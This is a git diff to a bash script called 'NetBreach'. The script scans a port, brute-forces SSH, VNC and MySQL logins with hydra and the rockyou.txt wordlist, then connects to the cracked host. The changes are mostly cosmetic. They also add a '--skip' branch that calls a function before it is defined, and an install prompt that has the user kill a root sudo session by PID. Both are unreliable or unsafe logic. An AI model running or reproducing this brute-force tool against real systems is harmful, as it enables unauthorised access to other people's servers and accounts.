@@ -41,30 +41,40 @@ trap ctrl_c SIGINT
 command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
+# check if the user has put --skip in the arguemnts 
+if [[ "$1" == "--skip" ]]; then
+    echo "Skipping package check"
+    sleep 1
+    NetBreach
+else
 
-# Check for required packages
-for package in "${required_packages[@]}"; do
-    if ! command_exists "$package"; then
-        echo ""
-        echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
-        sleep 1 
+    # Check for required packages
+    for package in "${required_packages[@]}"; do
+        if ! command_exists "$package"; then
+            echo ""
+            echo -e "[ ${RED}FAIL${NC} ] The required package ${GREEN}'${package}'${NC} is not installed. Please install it and try again."
+            sleep 1 
 
-        #asks the user if they want to install the packages that are mssing
-        echo "Would you like me to install it for you. YES/NO"
+            #asks the user if they want to install the packages that are mssing
+            echo "Would you like me to install it for you. YES/NO"
 
-        read -p ">>> " install
-        
-        if [[ " ${yes[*]} " == *" ${install} "* ]]; then
-            bash requirements.sh
-            exit 1
-        else
-            echo "Ok stopping program"
+            read -p ">>> " install
+            
+            if [[ " ${yes[*]} " == *" ${install} "* ]]; then
+                ps aux | grep sudo
+                echo "Input the PID for to kill the root session to install the packages."
+                read -p ">>> " session
+                kill -9 "${session}"
+                bash requirements.sh
+                exit 1
+            else
+                echo "Ok stopping program"
+                exit 1
+            fi
             exit 1
         fi
-        exit 1
-    fi
-done
-
+    done
+fi
 # Check if the script is run with --help or -h
 if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     figlet "? HELP ?"
@@ -80,14 +90,15 @@ if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     echo "When you give the program the username and hostname, it will try to crack that given parameters you gave it."
     echo
 else
+
     # Check if root user
-    if [[ $EUID -ne 0 ]]; then
+    if [[ "${EUID}" -ne 0 ]]; then
         echo -e "[ ${RED}FAIL${NC} ]: Please run as root."
         exit 1
     fi
     if [[ "$OSTYPE" == "${OS}"* ]]; then
         clear
-        if [[ $EUID -ne $root ]]; then
+        if [[ "${EUID}" -ne $root ]]; then
             # Error message if not running as root
             echo "ERROR:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
             echo -e "[ ${RED}FAIL${NC} ]: TIME:${CURRENT_TIME} Please run as ROOT. DATE:${CURRENT_DATE}"
@@ -114,7 +125,6 @@ else
             NetBreach() {
                 # The logo of the program
                 figlet -f slant "NetBreach"
-                figlet -f slant "GLOBAL"
                 echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
                 echo "If you want to stop the program type 'stop'."
                 read -p ">>> " service
@@ -134,7 +144,7 @@ else
                         open scan.txt
 
                     else
-                        echo -e "[ ${RED}FAIL${NC} ] Ok I will not open the scan.txt file"
+                        echo -e "Ok I will not open the scan.txt file"
                         sleep 1
                     fi
                     
@@ -192,8 +202,6 @@ else
                 read -p "Input Username: " user
                 read -p "Input Hostname: " host
                 read -p "Input Port: " port
-
-                echo -e "$${host}" >> Hostname.txt
             }
 
             RunHackingCommandWithVNC() {
@@ -210,17 +218,17 @@ else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
                         # Alerts the user that the computer is trying to connect to the VNC server
-                        title="Connecting to ${host}"
-                        Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
-                        echo "${title}"
-                        echo "${Connecting_To_VNC_SERVER}"
+                        title="Connecting to ${GREEN}${host}${NC}"
+                        Connecting_To_VNC_SERVER="We are connecting you to '${GREEN}${host}${NC}'. Please wait..."
+                        echo -e "${title}"
+                        echo -e "${Connecting_To_VNC_SERVER}"
                         sleep 5
 
                         # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                         # Notification for the user to see the computer is connected to the VNC server
-                        title="Enter password to ${host}"
-                        Connected_To_VNC_SERVER="We have connected you to '${host}'. Please enter the password to '${host}'. To continue..."
-                        echo
+                        title="Enter password to ${GREEN}${host}${NC}"
+                        Connected_To_VNC_SERVER="We have connected you to '${GREEN}${host}${NC}'. Please enter the password to '${GREEN}${host}${NC}'. To continue..."
+                        echo ""
                         echo "${title}"
                         echo "${Connected_To_VNC_SERVER}"
                         # Put the
@@ -247,19 +255,20 @@ else
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
-                        title="Connecting to ${user}"
-                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
+                        title="Connecting to ${GREEN}${user}${NC}"
+                        Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
                         echo ""
-                        echo "${title}"
-                        echo "${Connecting_To_SSH_SERVER}"
+                        echo -e "${title}"
+                        echo -e "${Connecting_To_SSH_SERVER}"
                         sleep 5
 
                         # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                         echo ""
-                        title="Enter password to ${user}"
-                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
-                        echo "${title}"
-                        echo "${Connected_To_SSH_SERVER}"
+                        title="Enter password to ${GREEN}${user}${NC}"
+                        Connected_To_SSH_SERVER="We have connected you to ${GREEN}${user}${NC}. Please enter the password to ${GREEN}${user}${NC} to continue..."
+                        echo ""
+                        echo -e "${title}"
+                        echo -e "${Connected_To_SSH_SERVER}"
                         echo ""
                         ssh "${user}@${host}" -p "${port}"
                     fi
@@ -278,10 +287,10 @@ else
                     # it will continue as normal
                     else
                         # Crack MySQL password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                         echo "Loading MySQL server..."
                         sleep 3
-                        mysql -u $user -p -A
+                        mysql -u "${user}" -p -A
                     fi
                 fi
             }
